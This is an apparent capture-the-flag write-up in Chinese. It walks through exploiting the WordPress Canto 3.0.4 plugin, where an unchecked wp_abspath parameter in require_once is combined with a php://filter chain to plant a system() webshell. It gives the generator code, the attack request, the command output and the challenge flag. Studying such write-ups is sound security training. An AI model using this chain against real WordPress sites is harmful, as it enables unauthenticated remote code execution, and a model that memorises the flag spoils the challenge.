## 题解

### 入口与指纹

`Apache/2.4.41 (Ubuntu)`，WordPress 6.5.4 + 主题 MELODIC MAYHEM（rock-tune）+
**唯一插件 Canto 3.0.4**。

`wp-content/uploads/2024/06/canto.3.0.4.zip` 就是官方安装包（与 wordpress.org 版本
逐字节一致，没有后门），所以可以直接读插件源码找入口。

### 关键观察

Canto 的 `includes/lib/` 下一批脚本**没有做任何权限检查**，第一行就是：

```php
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
```

也就是说 `wp_abspath` 完全可控，只是后面被拼了固定的 `/wp-admin/admin.php`。
之前误以为「后缀固定 ⇒ 只能包含 WP 的 admin.php」，实际上**流包装器会吃掉这个后缀**：

| `wp_abspath` | `require_once` 的实际目标 |
| --- | --- |
| `/var/www/html` | `/var/www/html/wp-admin/admin.php`（正常加载 WP，随后 `auth_redirect()` 302 到 wp-login） |
| `php://filter/<chain>/resource=php://temp` | `php://filter/<chain>/resource=php://temp/wp-admin/admin.php` —— `php://temp` 忽略多余路径，链生效 |

于是可以用 **php_filter_chain**（把任意 PHP 代码编码成一串
`convert.iconv.*` 过滤器）让 require 的流内容变成我们的 webshell。

### 利用链

```python
# chain 生成器与 xben-030 相同
from php_filter_chain import PHPFilterChainGenerator
chain = PHPFilterChainGenerator().generate_filter_chain("<?=system($_GET[0]);?>")
ap = f"{chain}/resource=php://temp"

GET /wp-content/plugins/canto/includes/lib/detail.php
    ?wp_abspath=<ap>&0=cat /FLAG.txt&subdomain=x&app_api=y&scheme=image&id=1
```

返回体前 184 字节即命令输出：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`ls -la /` 看到根目录有 **`FLAG.txt`**（大写）：

```bash
?wp_abspath=<ap>&0=cat /FLAG.txt
# flag{7bc5fa65-03bc-48d3-bde7-a5ce620d679c}
```

### flag 位置

容器根目录 `/FLAG.txt`。

## 复盘

- **「固定后缀」不是屏障。** 只要前缀可控且能写成流 URI，`php://filter/<chain>/resource=php://temp`
  就会把后面的 `/wp-admin/admin.php` 当成 temp 流的无效参数忽略掉。
  这和 `xben-030-24`（`BMI_ROOT_DIR` → `require_once BMI_INCLUDES.'/bypasser.php'`）是同一招，
  一个用于「未授权 include」，一个用于「拼接后缀的 include」。
- **先确认插件包是不是原版。** 下载实例里的 zip 与官方 3.0.4 做 `diff -rq`，
  结果完全一致，说明没有预留后门，考点就是源码里这些 lib 脚本。
- **`auth_redirect()` 只挡正常路径。** 直接 `wp_abspath=/var/www/html` 会被 WP 的
  `auth_redirect()` 302 到 wp-login，看起来「需要登录」；换成 php:// 流就绕开了整个 bootstrap。
- 命令走 query（`?0=`），因为 header 里塞 4.9KB 的链很危险；链长度上限约 8KB。
